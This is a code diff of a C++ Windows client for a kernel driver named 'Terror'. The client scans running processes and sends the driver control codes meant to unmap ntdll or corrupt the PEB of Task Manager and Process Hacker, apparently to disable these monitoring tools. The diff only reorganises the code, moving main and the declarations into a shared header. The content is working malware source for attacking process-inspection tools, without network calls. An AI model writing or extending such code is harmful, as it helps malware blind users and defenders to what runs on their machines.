@@ -1,17 +1,59 @@
-#include <Windows.h>
-#include <iostream>
-#include <TlHelp32.h>
-#include <set>
-
-HANDLE hDevice;
-
-std::set<DWORD> taskmanagerPIDlist;
-
-#define IO_UNMAP_NTDLL CTL_CODE(FILE_DEVICE_UNKNOWN, 0x111, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
-#define IO_CORRUPT_PEB CTL_CODE(FILE_DEVICE_UNKNOWN, 0x222, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
+#include "../defs.h"
 
 
+//forward decs
+bool CreateHandle();
+DWORD GetProcess();
 
+
+int main()
+{
+
+	if (!CreateHandle())
+	{
+		printf("failed to create handle:  %i\r\n", GetLastError());
+	}
+
+
+	while (true)
+	{
+		int code;
+		std::cin >> code;
+
+		if (code == 1)
+		{
+			ctlcode = IO_UNMAP_NTDLL;
+			printf("Unmap ntdll\n");
+			break;
+		}
+		else if (code == 2)
+		{
+			ctlcode = IO_CORRUPT_PEB;
+			printf("PEB corruption\n");
+			break;
+		}
+		else
+		{
+			printf("Wrong input\n");
+		}
+	}
+
+	while (true)
+	{
+		GetProcess();
+
+		Sleep(100);
+	}
+
+
+	CloseHandle(hDevice);
+
+	system("PAUSE");
+
+
+}
+
+//get handle to the driver
 bool CreateHandle()
 {
 	hDevice = CreateFileW(L"\\\\.\\Terror", GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
@@ -29,16 +71,7 @@ bool CreateHandle()
 }
 
 
-
-const wchar_t* taskManagerName = L"Taskmgr.exe";
-const wchar_t* processHackerName = L"ProcessHacker.exe";
-
-int processHackerPID;
-int taskManagerPID;
-
-DWORD ctlcode;
-
-
+//loop through the process list and if a target process is found, send the PID to the driver via the correct control code
 DWORD GetProcess()
 {
 	HANDLE snapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
@@ -93,52 +126,4 @@ DWORD GetProcess()
 
 	CloseHandle(snapshotHandle);
 	return NULL;
-}
-
-
-
-int main()
-{
-
-
-	if (!CreateHandle())
-	{
-		printf("failed to create handle:  %i\r\n", GetLastError());
-	}
-
-
-	while (true)
-	{
-		int code;
-		std::cin >> code;
-
-		if (code == 1)
-		{
-			ctlcode = IO_UNMAP_NTDLL;
-			break;
-		}
-		else if (code == 2)
-		{
-			ctlcode = IO_CORRUPT_PEB;
-			break;
-		}
-		else
-		{
-			printf("Wrong input\n");
-		}
-	}
-
-	while (true)
-	{
-		GetProcess();
-
-		Sleep(100);
-	}
-
-
-	CloseHandle(hDevice);
-
-	system("PAUSE");
-
-
 }
